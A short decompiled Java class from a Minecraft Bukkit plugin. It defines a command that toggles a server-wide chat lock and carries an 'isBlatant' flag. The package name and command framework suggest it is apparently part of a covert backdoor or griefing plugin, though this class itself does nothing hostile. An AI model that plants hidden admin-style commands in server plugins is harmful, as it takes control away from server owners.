/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.entity.Player;

public class TogglechatCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.chatLocked) {
            plugin.chatLocked = false;
            p2.sendMessage(Settings.PREFIX("Chat is now unlocked again"));
        } else {
            plugin.chatLocked = true;
            p2.sendMessage(Settings.PREFIX("Chat is now locked"));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

